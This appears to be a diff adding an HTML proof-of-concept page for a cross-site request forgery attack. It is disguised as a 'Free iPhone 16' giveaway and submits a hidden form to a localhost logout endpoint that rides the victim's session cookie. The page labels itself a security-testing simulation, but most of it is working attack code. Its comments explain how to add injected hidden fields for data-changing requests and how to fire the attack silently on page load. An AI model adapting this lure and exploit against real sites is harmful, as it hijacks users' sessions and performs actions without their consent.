@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Free iPhone Giveaway!! 🎁</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #1a1a2e;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: #16213e;
+      border: 2px solid #e94560;
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 500px;
+      text-align: center;
+    }
+    h1 { color: #e94560; font-size: 2em; margin-bottom: 10px; }
+    .status {
+      margin-top: 24px;
+      padding: 14px 20px;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: bold;
+    }
+    .waiting  { background: #333; color: #aaa; }
+    .attacking{ background: #5a3e00; color: #ffcc00; }
+    .done     { background: #1a4a1a; color: #66ff66; }
+    .log { font-size: 0.8em; margin-top: 16px; color: #888; text-align: left; }
+    code { background: #0a0a1a; padding: 2px 6px; border-radius: 4px; font-size: 0.85em; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>🎁 Claim Your Free iPhone 16!</h1>
+    <p>Congratulations! You have been selected. Click below to claim your prize.</p>
+    <p style="color:#888; font-size:0.8em;">(This is a CSRF attack simulation for security testing purposes)</p>
+
+    <div id="status" class="status waiting">Waiting for you to click...</div>
+
+    <button onclick="launchAttack()" style="
+      margin-top:20px; padding:12px 32px;
+      background:#e94560; color:#fff;
+      border:none; border-radius:8px;
+      font-size:1.1em; cursor:pointer;">
+      🎉 Claim Prize
+    </button>
+
+    <div class="log" id="log"></div>
+  </div>
+
+  <!--
+    CSRF ATTACK #1 — LOGOUT
+    A hidden form that silently POSTs to the target backend.
+    The browser sends the connect.sid session cookie because:
+      - localhost ports are treated as same-site by Chrome/Firefox
+      - SameSite attribute is not set (undefined) in dev mode
+  -->
+  <form id="csrf-logout"
+        action="http://localhost:5000/api/logout"
+        method="POST"
+        style="display:none">
+    <!--
+      Body can be empty for logout.
+      For data-changing attacks, add hidden inputs here:
+      <input type="hidden" name="fieldName" value="injectedValue" />
+    -->
+  </form>
+
+  <script>
+    const log = document.getElementById('log');
+    const statusEl = document.getElementById('status');
+
+    function addLog(msg) {
+      log.innerHTML += `<br/>→ ${msg}`;
+    }
+
+    function launchAttack() {
+      statusEl.className = 'status attacking';
+      statusEl.textContent = '⚡ Attack in progress...';
+
+      addLog('Target: <code>http://localhost:5000/api/logout</code>');
+      addLog('Method: <code>POST</code>');
+      addLog('Payload: none needed for logout');
+      addLog('Browser will auto-attach <code>connect.sid</code> session cookie');
+      addLog('Submitting hidden form...');
+
+      setTimeout(() => {
+        // Submit the hidden CSRF form — browser automatically includes session cookie
+        document.getElementById('csrf-logout').submit();
+      }, 1200);
+    }
+
+    // --- SILENT AUTO-ATTACK variant (no click needed) ---
+    // Uncomment the line below to make it fire automatically on page load.
+    // This simulates a real attack where the victim just visits the page.
+    //
+    // window.onload = () => setTimeout(() => document.getElementById('csrf-logout').submit(), 500);
+  </script>
+</body>
+</html>
